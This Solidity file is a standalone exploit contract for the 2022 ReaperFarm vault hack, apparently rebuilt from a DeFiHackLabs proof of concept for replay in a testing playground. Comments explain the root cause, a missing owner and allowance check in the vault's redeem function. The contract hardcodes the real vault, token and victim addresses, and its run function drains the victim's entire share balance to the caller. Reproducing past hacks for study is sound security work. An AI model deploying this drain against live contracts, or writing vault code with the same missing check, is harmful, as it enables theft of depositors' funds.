// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-08-ReaperFarm).
//
// The DeFiHackLabs PoC (test/ReaperFarm_exp.sol) runs the attack INLINE in the
// Foundry `Attacker` test harness — `attacker = address(this)`, the only call is
// `ReaperVault.redeem(victimShares, address(this), victim)`, and profit is
// measured as `USDC.balanceOf(address(this))`. There is no standalone contract
// to deploy. This file is a faithful, self-contained copy of that inline attack
// (the testExploit body + minimal inline interfaces — no imports so it compiles
// anywhere), compiled inside the registry forge project. Logic and constants are
// copied verbatim from test/ReaperFarm_exp.sol.
//
// Root cause: ReaperVaultV2 (rfUSDC) is an ERC-4626-style vault whose public
// `redeem(shares, receiver, owner)` and `withdraw(assets, receiver, owner)`
// functions let the caller specify an ARBITRARY `owner` whose shares are burned
// and an ARBITRARY `receiver` who gets the underlying — but OMITTED the standard
// ERC-4626 allowance gate (`if (msg.sender != owner) _spendAllowance(...)`).
// So anyone can call `redeem(victimShares, attacker, victim)`: the vault burns
// the victim's shares, pulls the underlying out of its strategy, and transfers
// it to the attacker. No approval, no flash loan, no capital.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IReaperVaultV2 {
    function balanceOf(address owner) external view returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}

contract ReaperFarmDrain {
    IReaperVaultV2 constant ReaperVault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
    IERC20 constant USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);

    // The victim whose rfUSDC shares we redeem. Any non-zero depositor works;
    // this is the address the original PoC targeted (a Reaper vault owner).
    address constant VICTIM = 0x59cb9F088806E511157A6c92B293E5574531022A;

    function run() external {
        // 1. Read the victim's entire rfUSDC share balance.
        uint256 victimShares = ReaperVault.balanceOf(VICTIM);
        // 2. Redeem it as a THIRD PARTY: owner = VICTIM, receiver = this
        //    contract. There is NO msg.sender == owner check and NO allowance
        //    spent — the vault burns the victim's shares and sends us the
        //    underlying USDC.
        ReaperVault.redeem(victimShares, address(this), VICTIM);
    }
}
